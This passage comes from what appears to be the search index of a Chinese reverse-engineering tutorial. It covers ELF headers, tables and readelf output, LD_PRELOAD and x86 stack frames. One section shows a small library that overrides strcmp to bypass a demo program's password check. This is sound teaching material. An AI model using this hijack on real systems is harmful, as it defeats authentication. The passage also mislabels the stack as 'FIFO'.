this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 9 Size of section headers: 40 (bytes) Number of section headers: 30 Section header string table index: 29","title":"\u6587\u4ef6\u5934"},{"location":"Tutorial/Material/Reverse/#_29","text":"\u7a0b\u5e8f\u5934\u8868\u662f\u7531 ELF \u5934\u7684 e_phoff \u6307\u5b9a\u7684\u504f\u79fb\u91cf\u548c e_phentsize \u3001 e_phnum \u5171\u540c\u786e\u5b9a\u5927\u5c0f\u7684\u8868\u683c\u7ec4\u6210\u3002 e_phentsize \u8868\u793a\u8868\u683c\u4e2d\u7a0b\u5e8f\u5934\u7684\u5927\u5c0f\uff0c e_phnum \u8868\u793a\u8868\u683c\u4e2d\u7a0b\u5e8f\u5934\u7684\u6570\u91cf\u3002 \u7a0b\u5e8f\u5934\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a typedef struct { Elf32_Word p_type; /* Segment type */ Elf32_Off p_offset; /* Segment file offset */ Elf32_Addr p_vaddr; /* Segment virtual address */ Elf32_Addr p_paddr; /* Segment physical address */ Elf32_Word p_filesz; /* Segment size in file */ Elf32_Word p_memsz; /* Segment size in memory */ Elf32_Word p_flags; /* Segment flags */ Elf32_Word p_align; /* Segment alignment */ } Elf32_Phdr; typedef struct { Elf64_Word p_type; /* Segment type */ Elf64_Word p_flags; /* Segment flags */ Elf64_Off p_offset; /* Segment file offset */ Elf64_Addr p_vaddr; /* Segment virtual address */ Elf64_Addr p_paddr; /* Segment physical address */ Elf64_Xword p_filesz; /* Segment size in file */ Elf64_Xword p_memsz; /* Segment size in memory */ Elf64_Xword p_align; /* Segment alignment */ } Elf64_Phdr; \u4f7f\u7528 readelf \u6765\u67e5\u770b\u7a0b\u5e8f\u5934\uff1a $ readelf -l elfDemo.out Elf file type is DYN (Shared object file) Entry point 0x3e0 There are 9 program headers, starting at offset 52 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align PHDR 0x000034 0x00000034 0x00000034 0x00120 0x00120 R E 0x4 INTERP 0x000154 0x00000154 0x00000154 0x00013 0x00013 R 0x1 [Requesting program interpreter: /lib/ld-linux.so.2] LOAD 0x000000 0x00000000 0x00000000 0x00780 0x00780 R E 0x1000 LOAD 0x000ef4 0x00001ef4 0x00001ef4 0x00130 0x0013c RW 0x1000 DYNAMIC 0x000efc 0x00001efc 0x00001efc 0x000f0 0x000f0 RW 0x4 NOTE 0x000168 0x00000168 0x00000168 0x00044 0x00044 R 0x4 GNU_EH_FRAME 0x000624 0x00000624 0x00000624 0x00044 0x00044 R 0x4 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10 GNU_RELRO 0x000ef4 0x00001ef4 0x00001ef4 0x0010c 0x0010c R 0x1 Section to Segment mapping: Segment Sections... 00 01 .interp 02 .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 03 .init_array .fini_array .dynamic .got .got.plt .data .bss 04 .dynamic 05 .note.ABI-tag .note.gnu.build-id 06 .eh_frame_hdr 07 08 .init_array .fini_array .dynamic .got","title":"\u7a0b\u5e8f\u5934"},{"location":"Tutorial/Material/Reverse/#_30","text":"\u6bb5\u8868\uff08Section Header Table\uff09\u662f\u4e00\u4e2a\u4ee5 Elf32_Shdr \u3000\u7ed3\u6784\u4f53\u4e3a\u5143\u7d20\u7684\u6570\u7ec4\uff0c\u6bcf\u4e2a\u7ed3\u6784\u4f53\u5bf9\u5e94\u4e00\u4e2a\u6bb5\uff0c\u5b83\u63cf\u8ff0\u4e86\u5404\u4e2a\u6bb5\u7684\u4fe1\u606f\u3002ELF \u6587\u4ef6\u5934\u7684 e_shoff \u3000\u6210\u5458\u7ed9\u51fa\u4e86\u6bb5\u8868\u5728 ELF \u4e2d\u7684\u504f\u79fb\uff0c e_shnum \u6210\u5458\u7ed9\u51fa\u4e86\u6bb5\u63cf\u8ff0\u7b26\u7684\u6570\u91cf\uff0c e_shentsize \u7ed9\u51fa\u4e86\u6bcf\u4e2a\u6bb5\u63cf\u8ff0\u7b26\u7684\u5927\u5c0f\u3002 typedef struct { Elf32_Word sh_name; /* Section name (string tbl index) */ Elf32_Word sh_type; /* Section type */ Elf32_Word sh_flags; /* Section flags */ Elf32_Addr sh_addr; /* Section virtual addr at execution */ Elf32_Off sh_offset; /* Section file offset */ Elf32_Word sh_size; /* Section size in bytes */ Elf32_Word sh_link; /* Link to another section */ Elf32_Word sh_info; /* Additional section information */ Elf32_Word sh_addralign; /* Section alignment */ Elf32_Word sh_entsize; /* Entry size if section holds table */ } Elf32_Shdr; typedef struct { Elf64_Word sh_name; /* Section name (string tbl index) */ Elf64_Word sh_type; /* Section type */ Elf64_Xword sh_flags; /* Section flags */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Section size in bytes */ Elf64_Word sh_link; /* Link to another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */ } Elf64_Shdr; \u4f7f\u7528 readelf \u547d\u4ee4\u67e5\u770b\u76ee\u6807\u6587\u4ef6\u4e2d\u5b8c\u6574\u7684\u6bb5\uff1a $ readelf -S elfDemo.o There are 15 section headers, starting at offset 0x41c: Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .group GROUP 00000000 000034 000008 04 12 16 4 [ 2] .text PROGBITS 00000000 00003c 000078 00 AX 0 0 1 [ 3] .rel.text REL 00000000 000338 000048 08 I 12 2 4 [ 4] .data PROGBITS 00000000 0000b4 000008 00 WA 0 0 4 [ 5] .bss NOBITS 00000000 0000bc 000004 00 WA 0 0 4 [ 6] .rodata PROGBITS 00000000 0000bc 000004 00 A 0 0 1 [ 7] .text.__x86.get_p PROGBITS 00000000 0000c0 000004 00 AXG 0 0 1 [ 8] .comment PROGBITS 00000000 0000c4 000012 01 MS 0 0 1 [ 9] .note.GNU-stack PROGBITS 00000000 0000d6 000000 00 0 0 1 [10] .eh_frame PROGBITS 00000000 0000d8 00007c 00 A 0 0 4 [11] .rel.eh_frame REL 00000000 000380 000018 08 I 12 10 4 [12] .symtab SYMTAB 00000000 000154 000140 10 13 13 4 [13] .strtab STRTAB 00000000 000294 0000a2 00 0 0 1 [14] .shstrtab STRTAB 00000000 000398 000082 00 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), p (processor specific) \u6ce8\u610f\uff0cELF \u6bb5\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u88ab\u4fdd\u7559\u7684\uff0c\u7c7b\u578b\u4e3a NULL\u3002","title":"\u6bb5"},{"location":"Tutorial/Material/Reverse/#_31","text":"\u5b57\u7b26\u4e32\u8868\u4ee5\u6bb5\u7684\u5f62\u5f0f\u5b58\u5728\uff0c\u5305\u542b\u4e86\u4ee5 null\u3000\u7ed3\u5c3e\u7684\u5b57\u7b26\u5e8f\u5217\u3002\u5bf9\u8c61\u6587\u4ef6\u4f7f\u7528\u8fd9\u4e9b\u5b57\u7b26\u4e32\u6765\u8868\u793a\u7b26\u53f7\u548c\u6bb5\u540d\u79f0\uff0c\u5f15\u7528\u5b57\u7b26\u4e32\u65f6\u53ea\u9700\u7ed9\u51fa\u5728\u8868\u4e2d\u7684\u504f\u79fb\u5373\u53ef\u3002\u5b57\u7b26\u4e32\u8868\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u548c\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u4e3a\u7a7a\u5b57\u7b26\uff0c\u4ee5\u786e\u4fdd\u6240\u6709\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u548c\u7ec8\u6b62\u3002\u901a\u5e38\u6bb5\u540d\u4e3a .strtab \u7684\u5b57\u7b26\u4e32\u8868\u662f \u5b57\u7b26\u4e32\u8868\uff08Strings Table\uff09 \uff0c\u6bb5\u540d\u4e3a .shstrtab \u7684\u662f\u6bb5\u8868\u5b57\u7b26\u4e32\u8868\uff08Section Header String Table\uff09\u3002 \u504f\u79fb +0 +1 +2 +3 +4 +5 +6 +7 +8 +9 +0 \\0 h e l l o \\0 w o r +10 l d \\0 h e l l o w o +20 r l d \\0 \u504f\u79fb \u5b57\u7b26\u4e32 0 \u7a7a\u5b57\u7b26\u4e32 1 hello 7 world 13 helloworld 18 world \u53ef\u4ee5\u4f7f\u7528 readelf \u8bfb\u53d6\u8fd9\u4e24\u4e2a\u8868\uff1a $ readelf -x .strtab elfDemo.o Hex dump of section '.strtab': 0x00000000 00656c66 44656d6f 2e63006c 6f63616c .elfDemo.c.local 0x00000010 5f737461 7469635f 696e6974 5f766172 _static_init_var 0x00000020 2e323139 35006c6f 63616c5f 73746174 .2195.local_stat 0x00000030 69635f75 6e696e69 745f7661 722e3231 ic_uninit_var.21 0x00000040 39360067 6c6f6261 6c5f696e 69745f76 96.global_init_v 0x00000050 61720067 6c6f6261 6c5f756e 696e6974 ar.global_uninit 0x00000060 5f766172 0066756e 63005f5f 7838362e _var.func.__x86. 0x00000070 6765745f 70635f74 68756e6b 2e617800 get_pc_thunk.ax. 0x00000080 5f474c4f 42414c5f 4f464653 45545f54 _GLOBAL_OFFSET_T 0x00000090 41424c45 5f007072 696e7466 006d6169 ABLE_.printf.mai 0x000000a0 6e00 $ readelf -x .shstrtab elfDemo.o Hex dump of section '.shstrtab': 0x00000000 002e7379 6d746162 002e7374 72746162 ..symtab..strtab 0x00000010 002e7368 73747274 6162002e 72656c2e ..shstrtab..rel. 0x00000020 74657874 002e6461 7461002e 62737300 text..data..bss. 0x00000030 2e726f64 61746100 2e746578 742e5f5f .rodata..text.__ 0x00000040 7838362e 6765745f 70635f74 68756e6b x86.get_pc_thunk 0x00000050 2e617800 2e636f6d 6d656e74 002e6e6f .ax..comment..no 0x00000060 74652e47 4e552d73 7461636b 002e7265 te.GNU-stack..re 0x00000070 6c2e6568 5f667261 6d65002e 67726f75 l.eh_frame..grou 0x00000080 7000","title":"\u5b57\u7b26\u4e32\u8868"},{"location":"Tutorial/Material/Reverse/#_32","text":"\u76ee\u6807\u6587\u4ef6\u7684\u7b26\u53f7\u8868\u4fdd\u5b58\u4e86\u5b9a\u4f4d\u548c\u91cd\u5b9a\u4f4d\u7a0b\u5e8f\u7684\u7b26\u53f7\u5b9a\u4e49\u548c\u5f15\u7528\u6240\u9700\u7684\u4fe1\u606f\u3002\u7b26\u53f7\u8868\u7d22\u5f15\u662f\u8fd9\u4e2a\u6570\u7ec4\u7684\u4e0b\u6807\u3002\u7d22\u5f15\uff10\u6307\u5411\u8868\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6761\u76ee\uff0c\u4f5c\u4e3a\u672a\u5b9a\u4e49\u7684\u7b26\u53f7\u7d22\u5f15\u3002 typedef struct { Elf32_Word st_name; /* Symbol name (string tbl index) */ Elf32_Addr st_value; /* Symbol value */ Elf32_Word st_size; /* Symbol size */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf32_Section st_shndx; /* Section index */ } Elf32_Sym; typedef struct { Elf64_Word st_name; /* Symbol name (string tbl index) */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf64_Section st_shndx; /* Section index */ Elf64_Addr st_value; /* Symbol value */ Elf64_Xword st_size; /* Symbol size */ } Elf64_Sym; \u67e5\u770b\u7b26\u53f7\u8868\uff1a $ readelf -s elfDemo.o Symbol table '.symtab' contains 20 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000000 0 NOTYPE LOCAL DEFAULT UND 1: 00000000 0 FILE LOCAL DEFAULT ABS elfDemo.c 2: 00000000 0 SECTION LOCAL DEFAULT 2 3: 00000000 0 SECTION LOCAL DEFAULT 4 4: 00000000 0 SECTION LOCAL DEFAULT 5 5: 00000000 0 SECTION LOCAL DEFAULT 6 6: 00000004 4 OBJECT LOCAL DEFAULT 4 local_static_init_var.219 7: 00000000 4 OBJECT LOCAL DEFAULT 5 local_static_uninit_var.2 8: 00000000 0 SECTION LOCAL DEFAULT 7 9: 00000000 0 SECTION LOCAL DEFAULT 9 10: 00000000 0 SECTION LOCAL DEFAULT 10 11: 00000000 0 SECTION LOCAL DEFAULT 8 12: 00000000 0 SECTION LOCAL DEFAULT 1 13: 00000000 4 OBJECT GLOBAL DEFAULT 4 global_init_var 14: 00000004 4 OBJECT GLOBAL DEFAULT COM global_uninit_var 15: 00000000 46 FUNC GLOBAL DEFAULT 2 func 16: 00000000 0 FUNC GLOBAL HIDDEN 7 __x86.get_pc_thunk.ax 17: 00000000 0 NOTYPE GLOBAL DEFAULT UND _GLOBAL_OFFSET_TABLE_ 18: 00000000 0 NOTYPE GLOBAL DEFAULT UND printf 19: 0000002e 74 FUNC GLOBAL DEFAULT 2 main","title":"\u7b26\u53f7\u8868"},{"location":"Tutorial/Material/Reverse/#_33","text":"\u91cd\u5b9a\u4f4d\u662f\u8fde\u63a5\u7b26\u53f7\u5b9a\u4e49\u4e0e\u7b26\u53f7\u5f15\u7528\u7684\u8fc7\u7a0b\u3002\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u5fc5\u987b\u5177\u6709\u63cf\u8ff0\u5982\u4f55\u4fee\u6539\u6bb5\u5185\u5bb9\u7684\u4fe1\u606f\uff0c\u4ece\u800c\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u5bf9\u8c61\u6587\u4ef6\u4fdd\u5b58\u8fdb\u7a0b\u7a0b\u5e8f\u6620\u50cf\u7684\u6b63\u786e\u4fe1\u606f\u3002 typedef struct { Elf32_Addr r_offset; /* Address */ Elf32_Word r_info; /* Relocation type and symbol index */ } Elf32_Rel; typedef struct { Elf64_Addr r_offset; /* Address */ Elf64_Xword r_info; /* Relocation type and symbol index */ Elf64_Sxword r_addend; /* Addend */ } Elf64_Rela; \u67e5\u770b\u91cd\u5b9a\u4f4d\u8868\uff1a $ readelf -r elfDemo.o Relocation section '.rel.text' at offset 0x338 contains 9 entries: Offset Info Type Sym.Value Sym. Name 00000008 00001002 R_386_PC32 00000000 __x86.get_pc_thunk.ax 0000000d 0000110a R_386_GOTPC 00000000 _GLOBAL_OFFSET_TABLE_ 00000019 00000509 R_386_GOTOFF 00000000 .rodata 00000021 00001204 R_386_PLT32 00000000 printf 00000040 00001002 R_386_PC32 00000000 __x86.get_pc_thunk.ax 00000045 0000110a R_386_GOTPC 00000000 _GLOBAL_OFFSET_TABLE_ 00000052 00000d09 R_386_GOTOFF 00000000 global_init_var 0000005d 00000309 R_386_GOTOFF 00000000 .data 00000068 00000f02 R_386_PC32 00000000 func Relocation section '.rel.eh_frame' at offset 0x380 contains 3 entries: Offset Info Type Sym.Value Sym. Name 00000020 00000202 R_386_PC32 00000000 .text 00000044 00000202 R_386_PC32 00000000 .text 00000070 00000802 R_386_PC32 00000000 .text.__x86.get_pc_thu","title":"\u91cd\u5b9a\u4f4d"},{"location":"Tutorial/Material/Reverse/#_34","text":"\u52a8\u6001\u94fe\u63a5\u76f8\u5173\u7684\u73af\u5883\u53d8\u91cf","title":"\u52a8\u6001\u94fe\u63a5"},{"location":"Tutorial/Material/Reverse/#_35","text":"","title":"\u52a8\u6001\u94fe\u63a5\u76f8\u5173\u7684\u73af\u5883\u53d8\u91cf"},{"location":"Tutorial/Material/Reverse/#ld_preload","text":"LD_PRELOAD \u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u5b9a\u4e49\u5728\u7a0b\u5e8f\u8fd0\u884c\u524d\u4f18\u5148\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u8fd9\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u6709\u9009\u62e9\u6027\u5730\u52a0\u8f7d\u4e0d\u540c\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u7684\u76f8\u540c\u51fd\u6570\uff0c\u5373\u901a\u8fc7\u8bbe\u7f6e\u8be5\u53d8\u91cf\uff0c\u5728\u4e3b\u7a0b\u5e8f\u548c\u5176\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u95f4\u52a0\u8f7d\u522b\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u751a\u81f3\u8986\u76d6\u539f\u672c\u7684\u5e93\u3002\u8fd9\u5c31\u6709\u53ef\u80fd\u51fa\u73b0\u52ab\u6301\u7a0b\u5e8f\u6267\u884c\u7684\u5b89\u5168\u95ee\u9898\u3002 #include<stdio.h> #include<string.h> void main() { char passwd[] = \"password\"; char str[128]; scanf(\"%s\", &str); if (!strcmp(passwd, str)) { printf(\"correct\\n\"); return; } printf(\"invalid\\n\"); } \u4e0b\u9762\u6211\u4eec\u6784\u9020\u4e00\u4e2a\u6076\u610f\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u6765\u91cd\u8f7d strcmp() \u51fd\u6570\uff0c\u7f16\u8bd1\u4e3a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u5e76\u8bbe\u7f6e LD_PRELOAD \u73af\u5883\u53d8\u91cf\uff1a $ cat hack.c #include<stdio.h> #include<stdio.h> int strcmp(const char *s1, const char *s2) { printf(\"hacked\\n\"); return 0; } $ gcc -shared -o hack.so hack.c $ gcc ldpreload.c $ ./a.out asdf invalid $ LD_PRELOAD=\"./hack.so\" ./a.out asdf hacked correct","title":"LD_PRELOAD"},{"location":"Tutorial/Material/Reverse/#ld_show_auxv","text":"AUXV \u662f\u5185\u6838\u5728\u6267\u884c ELF \u6587\u4ef6\u65f6\u4f20\u9012\u7ed9\u7528\u6237\u7a7a\u95f4\u7684\u4fe1\u606f\uff0c\u8bbe\u7f6e\u8be5\u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u663e\u793a\u8fd9\u4e9b\u4fe1\u606f\u3002\u5982\uff1a $ LD_SHOW_AUXV=1 ls AT_SYSINFO_EHDR: 0x7fff41fbc000 AT_HWCAP: bfebfbff AT_PAGESZ: 4096 AT_CLKTCK: 100 AT_PHDR: 0x55f1f623e040 AT_PHENT: 56 AT_PHNUM: 9 AT_BASE: 0x7f277e1ec000 AT_FLAGS: 0x0 AT_ENTRY: 0x55f1f6243060 AT_UID: 1000 AT_EUID: 1000 AT_GID: 1000 AT_EGID: 1000 AT_SECURE: 0 AT_RANDOM: 0x7fff41effbb9 AT_EXECFN: /usr/bin/ls AT_PLATFORM: x86_64","title":"LD_SHOW_AUXV"},{"location":"Tutorial/Material/Reverse/#_36","text":"\u4ec0\u4e48\u662f\u5185\u5b58 \u6808\u4e0e\u8c03\u7528\u7ea6\u5b9a \u5806\u4e0e\u5185\u5b58\u7ba1\u7406","title":"\u5185\u5b58\u7ba1\u7406"},{"location":"Tutorial/Material/Reverse/#_37","text":"\u4e3a\u4e86\u4f7f\u7528\u6237\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u5177\u6709\u4e00\u4e2a\u79c1\u6709\u7684\u5730\u5740\u7a7a\u95f4\u3001\u6709\u81ea\u5df1\u7684 CPU\uff0c\u5c31\u50cf\u72ec\u5360\u4e86\u6574\u4e2a\u8ba1\u7b97\u673a\u4e00\u6837\uff0c\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u63d0\u51fa\u4e86\u865a\u62df\u5185\u5b58\u7684\u6982\u5ff5\u3002 \u865a\u62df\u5185\u5b58\u7684\u4e3b\u8981\u4f5c\u7528\u4e3b\u8981\u4e3a\u4e09\u4e2a\uff1a \u5b83\u5c06\u5185\u5b58\u770b\u505a\u4e00\u4e2a\u5b58\u50a8\u5728\u78c1\u76d8\u4e0a\u7684\u5730\u5740\u7a7a\u95f4\u7684\u9ad8\u901f\u7f13\u5b58\uff0c\u5728\u5185\u5b58\u4e2d\u53ea\u4fdd\u5b58\u6d3b\u52a8\u533a\u57df\uff0c\u5e76\u6839\u636e\u9700\u8981\u5728\u78c1\u76d8\u548c\u5185\u5b58\u4e4b\u95f4\u6765\u56de\u4f20\u9001\u6570\u636e\u3002 \u5b83\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u63d0\u4f9b\u4e86\u4e00\u81f4\u7684\u5730\u5740\u7a7a\u95f4\u3002 \u5b83\u4fdd\u62a4\u4e86\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e0d\u88ab\u5176\u4ed6\u8fdb\u7a0b\u7834\u574f\u3002 \u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u91c7\u7528\u865a\u62df\u5bfb\u5740\u7684\u65b9\u5f0f\uff0cCPU \u901a\u8fc7\u751f\u6210\u4e00\u4e2a\u865a\u62df\u5730\u5740\uff08Virtual Address(VA)\uff09\u6765\u8bbf\u95ee\u5185\u5b58\uff0c\u7136\u540e\u8fd9\u4e2a\u865a\u62df\u5730\u5740\u901a\u8fc7\u5185\u5b58\u7ba1\u7406\u5355\u5143\uff08Memory Management Unit(MMU)\uff09\u8f6c\u6362\u6210\u7269\u7406\u5730\u5740\u4e4b\u540e\u88ab\u9001\u5230\u5b58\u50a8\u5668\u3002 \u524d\u9762\u6211\u4eec\u5df2\u7ecf\u770b\u5230\u53ef\u6267\u884c\u6587\u4ef6\u88ab\u6620\u5c04\u5230\u4e86\u5185\u5b58\u4e2d\uff0cLinux \u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u7ef4\u6301\u4e86\u4e00\u4e2a\u5355\u72ec\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff0c\u5305\u62ec\u4e86 .text\u3001.data\u3001.bss\u3001\u6808\uff08stack\uff09\u3001\u5806\uff08heap\uff09\uff0c\u5171\u4eab\u5e93\u7b49\u5185\u5bb9\u3002 32 \u4f4d\u7cfb\u7edf\u6709 4GB \u7684\u5730\u5740\u7a7a\u95f4\uff0c\u5176\u4e2d 0x08048000~0xbfffffff \u662f\u7528\u6237\u7a7a\u95f4\uff083GB\uff09\uff0c0xc0000000~0xffffffff \u662f\u5185\u6838\u7a7a\u95f4\uff08\uff11GB\uff09\u3002","title":"\u4ec0\u4e48\u662f\u5185\u5b58"},{"location":"Tutorial/Material/Reverse/#_38","text":"","title":"\u6808\u4e0e\u8c03\u7528\u7ea6\u5b9a"},{"location":"Tutorial/Material/Reverse/#_39","text":"\u6808\u662f\u4e00\u4e2a\u5148\u5165\u540e\u51fa\uff08First In Last Out(FIFO)\uff09\u7684\u5bb9\u5668\u3002\u7528\u4e8e\u5b58\u653e\u51fd\u6570\u8fd4\u56de\u5730\u5740\u53ca\u53c2\u6570\u3001\u4e34\u65f6\u53d8\u91cf\u548c\u6709\u5173\u4e0a\u4e0b\u6587\u7684\u5185\u5bb9\u3002\u7a0b\u5e8f\u5728\u8c03\u7528\u51fd\u6570\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u81ea\u52a8\u901a\u8fc7\u538b\u6808\u548c\u5f39\u6808\u5b8c\u6210\u4fdd\u5b58\u51fd\u6570\u73b0\u573a\u7b49\u64cd\u4f5c\uff0c\u4e0d\u9700\u8981\u7a0b\u5e8f\u5458\u624b\u52a8\u5e72\u9884\u3002 \u6808\u7531\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u589e\u957f\uff0c\u6808\u4fdd\u5b58\u4e86\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\u6240\u9700\u8981\u7684\u7ef4\u62a4\u4fe1\u606f\uff0c\u79f0\u4e3a\u5806\u6808\u5e27\uff08Stack Frame\uff09\u5728 x86 \u4f53\u7cfb\u4e2d\uff0c\u5bc4\u5b58\u5668 ebp \u6307\u5411\u5806\u6808\u5e27\u7684\u5e95\u90e8\uff0c esp \u6307\u5411\u5806\u6808\u5e27\u7684\u9876\u90e8\u3002\u538b\u6808\u65f6\u6808\u9876\u5730\u5740\u51cf\u5c0f\uff0c\u5f39\u6808\u65f6\u6808\u9876\u5730\u5740\u589e\u5927\u3002 PUSH \uff1a\u7528\u4e8e\u538b\u6808\u3002\u5c06 esp \u51cf 4\uff0c\u7136\u540e\u5c06\u5176\u552f\u4e00\u64cd\u4f5c\u6570\u7684\u5185\u5bb9\u5199\u5165\u5230 esp \u6307\u5411\u7684\u5185\u5b58\u5730\u5740 POP \uff1a\u7528\u4e8e\u5f39\u6808\u3002\u4ece esp \u6307\u5411\u7684\u5185\u5b58\u5730\u5740\u83b7\u5f97\u6570\u636e\uff0c\u5c06\u5176\u52a0\u8f7d\u5230\u6307\u4ee4\u64cd\u4f5c\u6570\uff08\u901a\u5e38\u662f\u4e00\u4e2a\u5bc4\u5b58\u5668\uff09\u4e2d\uff0c\u7136\u540e\u5c06 esp \u52a0 4\u3002 x86 \u4f53\u7cfb\u4e0b\u51fd\u6570\u7684\u8c03\u7528\u603b\u662f\u8fd9\u6837\u7684\uff1a \u628a\u6240\u6709\u6216\u4e00\u90e8\u5206\u53c2\u6570\u538b\u5165\u6808\u4e2d\uff0c\u5982\u679c\u6709\u5176\u4ed6\u53c2\u6570\u6ca1\u6709\u5165\u6808\uff0c\u90a3\u4e48\u4f7f\u7528\u67d0\u4e9b\u7279\u5b9a\u7684\u5bc4\u5b58\u5668\u4f20\u9012\u3002 \u628a\u5f53\u524d\u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u538b\u5165\u6808\u4e2d\u3002 \u8df3\u8f6c\u5230\u51fd\u6570\u4f53\u6267\u884c\u3002 \u5176\u4e2d\u7b2c 2 \u6b65\u548c\u7b2c 3 \u6b65\u7531\u6307\u4ee4 call \u4e00\u8d77\u6267\u884c\u3002\u8df3\u8f6c\u5230\u51fd\u6570\u4f53\u4e4b\u540e\u5373\u5f00\u59cb\u6267\u884c\u51fd\u6570\uff0c\u800c x86 \u51fd\u6570\u4f53\u7684\u5f00\u5934\u662f\u8fd9\u6837\u7684\uff1a push ebp \uff1a\u628aebp\u538b\u5165\u6808\u4e2d\uff08old ebp\uff09\u3002 mov ebp, esp \uff1aebp=esp\uff08\u8fd9\u65f6ebp\u6307\u5411\u6808\u9876\uff0c\u800c\u6b64\u65f6\u6808\u9876\u5c31\u662fold ebp\uff09 [\u53ef\u9009] sub esp, XXX \uff1a\u5728\u6808\u4e0a\u5206\u914d XXX \u5b57\u8282\u7684\u4e34\u65f6\u7a7a\u95f4\u3002 [\u53ef\u9009] push XXX \uff1a\u4fdd\u5b58\u540d\u4e3a XXX \u7684\u5bc4\u5b58\u5668\u3002 \u628aebp\u538b\u5165\u6808\u4e2d\uff0c\u662f\u4e3a\u4e86\u5728\u51fd\u6570\u8fd4\u56de\u65f6\u6062\u590d\u4ee5\u524d\u7684ebp\u503c\uff0c\u800c\u538b\u5165\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u662f\u4e3a\u4e86\u4fdd\u6301\u67d0\u4e9b\u5bc4\u5b58\u5668\u5728\u51fd\u6570\u8c03\u7528\u524d\u540e\u4fdd\u5b58\u4e0d\u53d8\u3002\u51fd\u6570\u8fd4\u56de\u65f6\u7684\u64cd\u4f5c\u4e0e\u5f00\u5934\u6b63\u597d\u76f8\u53cd\uff1a [\u53ef\u9009] pop XXX \uff1a\u6062\u590d\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u3002 mov esp, ebp \uff1a\u6062\u590desp\u540c\u65f6\u56de\u6536\u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4\u3002 pop ebp \uff1a\u6062\u590d\u4fdd\u5b58\u7684ebp\u7684\u503c\u3002 ret \uff1a\u4ece\u6808\u4e2d\u53d6\u5f97\u8fd4\u56de\u5730\u5740\uff0c\u5e76\u8df3\u8f6c\u5230\u8be5\u4f4d\u7f6e\u3002 \u6808\u5e27\u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\uff1a PUSH ebp ; \u51fd\u6570\u5f00\u59cb\uff08\u4f7f\u7528ebp\u524d\u5148\u628a\u5df2\u6709\u503c\u4fdd\u5b58\u5230\u6808\u4e2d\uff09 MOV ebp, esp ; \u4fdd\u5b58\u5f53\u524desp\u5230ebp\u4e2d ... ; \u51fd\u6570\u4f53 ; \u65e0\u8bbaesp\u503c\u5982\u4f55\u53d8\u5316\uff0cebp\u90fd\u4fdd\u6301\u4e0d\u53d8\uff0c\u53ef\u4ee5\u5b89\u5168\u8bbf\u95ee\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\u3001\u53c2\u6570 MOV esp, ebp ; \u5c06\u51fd\u6570\u7684\u5176\u5b9e\u5730\u5740\u8fd4\u56de\u5230esp\u4e2d POP ebp ; \u51fd\u6570\u8fd4\u56de\u524d\u5f39\u51fa\u4fdd\u5b58\u5728\u6808\u4e2d\u7684ebp\u503c RET ; \u51fd\u6570\u8fd4\u56de\u5e76\u8df3\u8f6c \u51fd\u6570\u8c03\u7528\u540e\u6808\u7684\u6807\u51c6\u5e03\u5c40\u5982\u4e0b\u56fe\uff1a \u6211\u4eec\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50\uff1a \u6e90\u7801 #include<stdio.h> int add(int a, int b) { int x = a, y = b; return (x + y); } int main() { int a = 1, b = 2; printf(\"%d\\n\", add(a, b)); return 0; } \u4f7f\u7528 gdb \u67e5\u770b\u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u4e86\u8be6\u7ec6\u7684\u6ce8\u91ca\uff1a gdb-peda$ 